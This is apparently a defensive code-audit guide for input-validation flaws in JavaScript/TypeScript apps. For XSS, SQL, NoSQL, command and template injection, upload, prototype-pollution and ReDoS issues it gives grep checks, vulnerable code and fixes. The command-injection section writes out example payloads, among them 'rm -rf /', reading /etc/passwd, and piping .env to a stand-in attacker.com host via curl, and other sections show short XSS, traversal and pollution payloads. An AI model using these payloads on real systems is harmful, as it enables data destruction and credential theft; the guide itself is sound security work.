---
domain: input-validation
version: 1.0.0
stacks: []
always_load: true
owasp: [A03]
priority: [data-breach, ato]
---

## Quick Check

```bash
# XSS vectors — dangerouslySetInnerHTML, innerHTML, v-html (High)
grep -rn "dangerouslySetInnerHTML\|\.innerHTML\s*=\|v-html" --include="*.ts" --include="*.tsx" --include="*.js" --include="*.jsx" --include="*.vue"

# SQL injection via string concatenation — template literals or + in queries (Critical)
grep -rn "query\s*(\s*\`\|query\s*(\s*\"" --include="*.ts" --include="*.js" | grep -i "SELECT\|INSERT\|UPDATE\|DELETE" | grep "\${\|\" *+"

# Prisma raw SQL injection — $queryRawUnsafe / $executeRawUnsafe with variables (Critical)
grep -rn "\$queryRawUnsafe\|\$executeRawUnsafe" --include="*.ts" --include="*.js" --include="*.tsx"

# Mass assignment — req.body spread into ORM create/update (High)
grep -rn "\.create(\s*{.*\.\.\.\s*req\.body\|\.update(\s*{.*\.\.\.\s*req\.body" --include="*.ts" --include="*.js" --include="*.tsx"

# Command injection — child_process with user input (Critical)
grep -rn "child_process\.\(exec\|execSync\|spawn\)\s*(" --include="*.ts" --include="*.js" --include="*.tsx"

# Code injection — eval, new Function, vm.runInNewContext (Critical)
grep -rn "eval(\|new Function(\|vm\.runInNewContext(\|vm\.runInContext(" --include="*.ts" --include="*.js" --include="*.tsx"

# File upload without MIME validation or size limits (Medium)
grep -rn "multer\|busboy\|formidable\|upload" --include="*.ts" --include="*.js" --include="*.tsx" | grep -iv "mime\|filetype\|file-type\|maxFileSize\|limits"

# Prototype pollution — __proto__ or constructor.prototype in merge/assign (Medium)
grep -rn "__proto__\|constructor\.\s*prototype\|Object\.assign(\|lodash\.merge(\|_.merge(" --include="*.ts" --include="*.js" --include="*.tsx"
```

## Full Patterns

### XSS Patterns

**Pattern 1: DOM XSS via dangerouslySetInnerHTML**
**Vulnerability:** DOM-based Cross-Site Scripting
**Severity:** High
**Detect:**
```bash
grep -rn "dangerouslySetInnerHTML" --include="*.tsx" --include="*.jsx" --include="*.ts" --include="*.js"
```
Look for `dangerouslySetInnerHTML={{ __html: variable }}` where the variable includes or could include user-controlled content (from database, API response, URL params, form input).
**Impact:** Attacker injects `<script>` tags or event handlers (`<img onerror="...">`) that execute in the victim's browser. Steals session tokens, makes API calls as the user, defaces the UI.
**Fix:**
```tsx
// WRONG — unsanitized user content rendered as HTML
<div dangerouslySetInnerHTML={{ __html: post.content }} />

// RIGHT — sanitize with DOMPurify
import DOMPurify from 'dompurify'
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }} />

// BEST — don't render as HTML if you don't need to
<div>{post.content}</div>
```
**OWASP:** A03

---

**Pattern 2: Stored XSS via Unsanitized User Input**
**Vulnerability:** Stored/Persistent Cross-Site Scripting
**Severity:** High
**Detect:**
```bash
# Find user input stored and later rendered — check write paths
grep -rn "\.create(\|\.insert(" --include="*.ts" --include="*.js" | grep -i "content\|bio\|comment\|message\|description\|title"
# Then check render paths for those fields without sanitization
grep -rn "dangerouslySetInnerHTML\|\.innerHTML\|v-html" --include="*.tsx" --include="*.jsx" --include="*.vue"
```
User input stored in database and later rendered in HTML without sanitization. Common in: comments, profiles, bios, messages, markdown content.
**Impact:** Attacker submits `<script>alert(document.cookie)</script>` as their bio. Every user who views the profile gets hit. Persistent — affects all viewers until the malicious content is removed.
**Fix:** Sanitize on output (not just input). Use DOMPurify or similar sanitization library. For markdown, use a markdown renderer that strips dangerous HTML (e.g., `marked` with `sanitize: true` or `rehype-sanitize`).
**OWASP:** A03

---

**Pattern 3: Template Literal Injection in Frontend Frameworks**
**Vulnerability:** Client-side Template Injection
**Severity:** Medium
**Detect:**
```bash
# Event handlers constructed from user input
grep -rn "onClick=\|onError=\|onLoad=" --include="*.tsx" --include="*.jsx" | grep "\`\|\${"
# HTML constructed via template literals
grep -rn "document\.write\|\.innerHTML\s*=\s*\`" --include="*.ts" --include="*.js" --include="*.tsx"
```
User input inserted into template literals that are rendered in UI frameworks. Event handler injection: `<div onClick="${userInput}">`.
**Impact:** Attacker breaks out of the template context and injects arbitrary JavaScript.
**Fix:** Use framework-native rendering (React's `{}` JSX expressions auto-escape). Never construct HTML from template strings with user data.
**OWASP:** A03

---

### Injection Patterns

**Pattern 4: SQL Injection via String Concatenation**
**Vulnerability:** SQL Injection
**Severity:** Critical
**Detect:**
```bash
# Template literal SQL queries with interpolated variables
grep -rn "query\|execute" --include="*.ts" --include="*.js" | grep "\`.*SELECT\|INSERT\|UPDATE\|DELETE" | grep "\${"
# String concatenation in SQL queries
grep -rn "\"SELECT\|\"INSERT\|\"UPDATE\|\"DELETE" --include="*.ts" --include="*.js" | grep "\" *+"
```
SQL queries built with string concatenation or template literals containing user input:
```typescript
// VULNERABLE patterns
db.query(`SELECT * FROM users WHERE email = '${req.body.email}'`)
db.query("SELECT * FROM users WHERE id = " + req.params.id)
```
**Impact:** Full database compromise. Attacker can: read all data, modify data, delete tables, execute OS commands (in some DB configs), extract credentials.
**Fix:**
```typescript
// SECURE — parameterized query
db.query('SELECT * FROM users WHERE email = $1', [req.body.email])

// With Prisma — tagged template (auto-parameterized)
prisma.$queryRaw`SELECT * FROM users WHERE email = ${req.body.email}`

// NEVER use $queryRawUnsafe with user input
// prisma.$queryRawUnsafe(`SELECT * FROM users WHERE email = '${email}'`) // WRONG
```
**OWASP:** A03

---

**Pattern 5: Prisma Operator Injection**
**Vulnerability:** ORM Query Operator Injection
**Severity:** High
**Detect:**
```bash
# Unvalidated objects passed to Prisma where/orderBy
grep -rn "findMany\|findFirst\|findUnique\|updateMany\|deleteMany" --include="*.ts" --include="*.tsx" | grep "req\.body\|req\.query\|params\."
# Direct spread of request body into Prisma queries
grep -rn "where:\s*req\.body\|where:\s*{.*\.\.\.\s*req" --include="*.ts" --include="*.tsx"
```
Unvalidated objects passed to Prisma `where`, `orderBy`, or other query parameters. User-controlled input that could contain Prisma operators like `{ gte: 0 }`, `{ contains: '' }`, `{ not: null }`.
```typescript
// VULNERABLE — req.body.filter passed directly to where clause
const users = await prisma.user.findMany({ where: req.body.filter })
// Attacker sends: { "filter": { "email": { "contains": "" } } }
// Returns ALL users
```
**Impact:** Attacker crafts Prisma operator objects to bypass intended query filters, accessing data they shouldn't see.
**Fix:**
```typescript
// SECURE — validate with Zod before passing to Prisma
const filterSchema = z.object({
  email: z.string().email().optional(),
  name: z.string().max(100).optional()
})
const filter = filterSchema.parse(req.body.filter) // rejects operator objects
const users = await prisma.user.findMany({ where: filter })
```
**OWASP:** A03

---

**Pattern 6: Command Injection**
**Vulnerability:** OS Command Injection
**Severity:** Critical
**Detect:**
```bash
# exec/execSync with template literals or concatenation
grep -rn "exec(\|execSync(" --include="*.ts" --include="*.js" | grep "\`\|\${\|\" *+"
# spawn with shell: true (enables shell interpretation)
grep -rn "spawn(" --include="*.ts" --include="*.js" | grep "shell:\s*true"
```
`child_process.exec()`, `child_process.execSync()`, `child_process.spawn()` with user input in the command string. Also: `os.system()`, `subprocess.run()` in Python backends.
**Impact:** Full server compromise. Attacker injects shell commands: `; rm -rf /`, `; cat /etc/passwd`, `; curl attacker.com/steal?data=$(cat .env)`.
**Fix:**
```typescript
// WRONG — user input in shell command
exec(`convert ${req.body.filename} output.png`)
// Attacker sends: "file.jpg; cat .env | curl attacker.com"

// RIGHT — arguments as array, no shell interpretation
execFile('convert', [sanitizedFilename, 'output.png'])
```
**OWASP:** A03

---

**Pattern 7: NoSQL Injection**
**Vulnerability:** NoSQL Query Injection
**Severity:** High
**Detect:**
```bash
# MongoDB queries with unsanitized user input
grep -rn "\.find(\|\.findOne(\|\.updateOne(\|\.deleteOne(" --include="*.ts" --include="*.js" | grep "req\.body\|req\.query\|req\.params"
# MongoDB operator patterns in user-facing code
grep -rn '"\$gt"\|"\$ne"\|"\$regex"\|"\$where"' --include="*.ts" --include="*.js"
```
MongoDB queries where user input is passed directly as query operators: `{ $gt: '' }`, `{ $ne: null }`, `{ $regex: '' }`. Look for `req.body` passed directly to `.find()`, `.findOne()`, `.updateOne()`.
**Impact:** Authentication bypass: `{ password: { $ne: null } }` matches any non-null password. Data exfiltration via operator manipulation.
**Fix:**
```typescript
// WRONG — user input passed directly as query
const user = await db.collection('users').findOne({
  email: req.body.email,
  password: req.body.password // attacker sends { $ne: null }
})

// RIGHT — validate input types, reject objects
const email = z.string().email().parse(req.body.email)
const password = z.string().min(8).parse(req.body.password)
const user = await db.collection('users').findOne({ email, password })
```
**OWASP:** A03

---

**Pattern 8: Server-Side Template Injection (SSTI)**
**Vulnerability:** Server-Side Template Injection
**Severity:** High
**Detect:**
```bash
# Template engines rendering user-controlled template strings
grep -rn "ejs\.render(\|pug\.render(\|nunjucks\.renderString(\|handlebars\.compile(" --include="*.ts" --include="*.js" | grep "req\.\|params\.\|body\.\|query\."
# res.render with user-controlled template name
grep -rn "res\.render(\s*req\.\|res\.render(\s*params\." --include="*.ts" --include="*.js"
```
User input passed to server-side template engines (EJS, Pug, Handlebars, Nunjucks) without escaping. Look for `render()` calls with user-controlled template strings (not template data).
**Impact:** Attacker injects template syntax that gets evaluated server-side. Can lead to arbitrary code execution: `{{constructor.constructor('return process')().exit()}}`.
**Fix:** Never pass user input as the template itself. Only pass user data as variables to pre-compiled templates. Enable auto-escaping.
```typescript
// WRONG — user input IS the template
res.render(req.body.template, data)

// RIGHT — fixed template, user input as data only
res.render('profile', { name: req.body.name })
```
**OWASP:** A03

---

### Data Integrity Patterns

**Pattern 9: File Upload — MIME Type Spoofing**
**Vulnerability:** Unrestricted File Upload via MIME Spoofing
**Severity:** Medium
**Detect:**
```bash
# Upload handlers checking only Content-Type header or extension
grep -rn "mimetype\|content-type\|\.endsWith(\|\.split('\.'" --include="*.ts" --include="*.js" | grep -i "upload\|file\|multer"
# Missing magic byte validation
grep -rln "multer\|busboy\|formidable" --include="*.ts" --include="*.js" | xargs grep -L "file-type\|fileType\|magic"
```
File upload handlers that validate only the `Content-Type` header or file extension, not the actual file content (magic bytes).
**Impact:** Attacker uploads a malicious file (HTML with JS, executable) by spoofing the MIME type to match allowed types. If served back to users, it executes in their browser.
**Fix:**
```typescript
import { fileTypeFromBuffer } from 'file-type'

// Validate actual file content, not just the header
const type = await fileTypeFromBuffer(buffer)
if (!type || !['image/png', 'image/jpeg'].includes(type.mime)) {
  throw new Error('Invalid file type')
}
// Serve with Content-Disposition: attachment and strict Content-Type
```
**OWASP:** A03

---

**Pattern 10: File Upload — Path Traversal in Filename**
**Vulnerability:** Path Traversal via Uploaded Filename
**Severity:** High
**Detect:**
```bash
# Original filename used directly in file paths
grep -rn "originalname\|originalFilename\|filename" --include="*.ts" --include="*.js" | grep "path\.join\|writeFile\|createWriteStream\|savePath"
# Missing path traversal sanitization
grep -rn "\.\./" --include="*.ts" --include="*.js" | grep -i "file\|upload\|path"
```
Upload handler that uses the original filename from the client without sanitizing. Look for `req.file.originalname` used directly in file paths.
**Impact:** Attacker sets filename to `../../../.env` or `../../src/pages/index.html` to overwrite server files.
**Fix:**
```typescript
// WRONG — client-provided filename used directly
const savePath = path.join(uploadDir, req.file.originalname)

// RIGHT — generate random filename server-side
import crypto from 'crypto'
const ext = path.extname(req.file.originalname).toLowerCase()
const allowedExts = ['.png', '.jpg', '.jpeg', '.gif']
if (!allowedExts.includes(ext)) throw new Error('Invalid extension')
const safeFilename = `${crypto.randomUUID()}${ext}`
const savePath = path.join(uploadDir, safeFilename)
```
**OWASP:** A03

---

**Pattern 11: Prototype Pollution**
**Vulnerability:** Prototype Pollution via Object Merge
**Severity:** Medium
**Detect:**
```bash
# Deep merge with user-controlled data
grep -rn "lodash\.merge\|_.merge\|deepmerge\|Object\.assign" --include="*.ts" --include="*.js" | grep "req\.\|body\.\|params\.\|query\."
# __proto__ or constructor access patterns
grep -rn "__proto__\|constructor\[" --include="*.ts" --include="*.js"
```
Deep merge operations (`lodash.merge`, `Object.assign`, spread on nested objects) where user-controlled data is merged into application objects. Look for `__proto__`, `constructor`, `prototype` in request payloads.
**Impact:** Attacker sends `{ "__proto__": { "isAdmin": true } }`. If merged into an object, ALL objects in the application inherit `isAdmin = true`. Can escalate to RCE in some frameworks.
**Fix:**
```typescript
// WRONG — unfiltered merge of user input
const config = _.merge({}, defaults, req.body)

// RIGHT — strip dangerous keys before merge
function sanitize(obj: Record<string, unknown>): Record<string, unknown> {
  const clean = Object.create(null)
  for (const [key, val] of Object.entries(obj)) {
    if (['__proto__', 'constructor', 'prototype'].includes(key)) continue
    clean[key] = typeof val === 'object' && val !== null ? sanitize(val as Record<string, unknown>) : val
  }
  return clean
}
const config = _.merge({}, defaults, sanitize(req.body))

// BEST — validate with Zod schema (rejects unknown keys)
const configSchema = z.object({ theme: z.string(), lang: z.string() })
const config = { ...defaults, ...configSchema.parse(req.body) }
```
**OWASP:** A03

---

**Pattern 12: ReDoS (Regular Expression Denial of Service)**
**Vulnerability:** Regular Expression Denial of Service
**Severity:** Medium
**Detect:**
```bash
# Regex with nested quantifiers (catastrophic backtracking)
grep -rn "new RegExp(\|/.*[+*].*[+*]" --include="*.ts" --include="*.js" | grep "req\.\|body\.\|params\.\|query\.\|input\|user"
# User-supplied regex patterns compiled directly
grep -rn "new RegExp(\s*req\.\|new RegExp(\s*params\.\|new RegExp(\s*body\." --include="*.ts" --include="*.js"
```
Regular expressions with catastrophic backtracking patterns applied to user input. Look for patterns with nested quantifiers: `(a+)+`, `(a|b)*c`, `([a-zA-Z]+)*@`. Also: user-supplied regex patterns (e.g., search functionality that compiles user input as regex).
**Impact:** A crafted input string causes the regex engine to run for minutes or hours, consuming 100% CPU and blocking the Node.js event loop. Full denial of service.
**Fix:**
```typescript
// WRONG — user input compiled as regex
const pattern = new RegExp(req.query.search)
const results = items.filter(item => pattern.test(item.name))

// RIGHT — escape user input or use string methods
import { escapeRegExp } from 'lodash'
const pattern = new RegExp(escapeRegExp(req.query.search), 'i')

// BEST — use re2 for safe regex (no backtracking)
import RE2 from 're2'
const pattern = new RE2(req.query.search, 'i')

// SIMPLEST — avoid regex for user search entirely
const results = items.filter(item =>
  item.name.toLowerCase().includes(req.query.search.toLowerCase())
)
```
**OWASP:** A03
